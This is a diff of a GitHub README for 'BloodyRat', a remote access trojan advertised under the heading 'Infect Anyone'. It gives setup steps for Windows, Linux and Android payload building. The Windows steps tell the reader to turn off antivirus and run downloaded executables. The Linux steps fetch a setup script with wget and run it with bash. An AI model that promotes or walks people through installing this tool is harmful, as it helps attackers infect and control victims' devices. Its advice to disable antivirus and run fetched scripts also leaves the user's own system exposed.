@@ -47,33 +47,33 @@ Infect Anyone
 ### Supported OS
 | Platform | Support Status |
 |---|---|
-Windows XP | Supported
-Windows 7 | Supported
 Windows 8 | Supported
 Windows 10 | Supported
 Linux kali,ubuntu,Parrot | Supported
 Android | Support
 
 ### Windows
-Note :- Turn off Antivirus Before Downloading Zip File    
-##### Requirements:- **Java 8** , **Node.js**
+<p style="color: #FD1C03;"> ⚠️ Turn off Antivirus Before Downloading Zip File ⚠️ </p>
 
-##### Download:- [**Java**](https://www.oracle.com/java/technologies/javase-jre8-downloads.html) [**Node.js**](https://nodejs.org/en/download/)    
+#### Prerequisite:- **Java 8** , **Node.js**
 
-##### Installation:-
+#### <p style="color:#FF6700;"> Step 1 : Download java Version 8 according to your supported arch </p>
+ [**Click Here**](https://www.oracle.com/java/technologies/javase-jre8-downloads.html)
 
-###### • Download Zip file Of BloodyRat
+#### <p style="color:#FF6700;"> Step 2 : Download Node.js according to your supported arch </p>
+ [**Click Here**](https://nodejs.org/en/download/)
 
-###### • Run Setup.Exe 
- 
-###### • Run BloodyRat.Exe 
+##### Step 3 : Download Zip file [BloodyRat](https://github.com/Bhaviktutorials/BloodyRat/archive/refs/heads/main.zip)
 
+##### <p style="color:#29fa14;"> Step 4 : Run Setup.Exe
+
+##### <p style="color:#29fa14;"> Step 5 : Run BloodyRat.Exe
+---
 ### Linux
 #### <p align="center"> ```wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/setup```
 #### <p align="center"> ``` bash setup```
 
 ### Available Arguments
-* Optional Arguments
 
 |<p align="center"> Short Hand  | <p align="center">Full Hand | <p align="center">Description |
 | ----------  | --------- | ----------- |
@@ -82,21 +82,22 @@ Note :- Turn off Antivirus Before Downloading Zip File
 | <p align="center"> -v | <p align="center"> --version | <p align="center"> Display the current Bloody Rat Version installed in Device |
 |  <p align="center"> | <p align="center"> --fix-apkbuilder | <p align="center"> Fix aapt2 path to build apk |
 | <p align="center">  | <p align="center"> --fix -java_version   | <p align="center"> Fix java Version to 1.8.0 |
+---
 
 ### Android
-
+---
 ### Cloud Shell
 ***
 ## <p align="center"> Workflow ⚙️
 <br>
-<p align="center"> <img src="https://user-images.githubusercontent.com/64035221/112498824-e6bd7780-8dac-11eb-9b90-2df342283539.gif" width="500" height="400">
+<p align="center"> <img src="https://s6.gifyu.com/images/video2f548e81b367098f.gif" width="500" height="400">
 
 
 ***
 ## <p align="center"> Support <img src="https://user-images.githubusercontent.com/64035221/113476039-61b21c80-9496-11eb-93d1-97a97f6acaa6.png" width="30" height="30">
 <table align="center" style="border:1px solid black;margin-left:auto;margin-right:auto;">
   <tr>
-    <th><img src="https://user-images.githubusercontent.com/64035221/112847573-d535e180-90c4-11eb-8a9a-dc1dfe06a675.png" width="190" height="190"></th>
+    <th><img src="https://user-images.githubusercontent.com/64035221/125960726-f3e83d1e-159e-4885-bd86-f18db1b2d2f3.jpg" width="190" height="190"></th>
     <th><img src="https://user-images.githubusercontent.com/64035221/112848945-3a3e0700-90c6-11eb-9c6b-db74023fe3f2.png" width="190" height="190"></th>
   </tr>
   <tr>
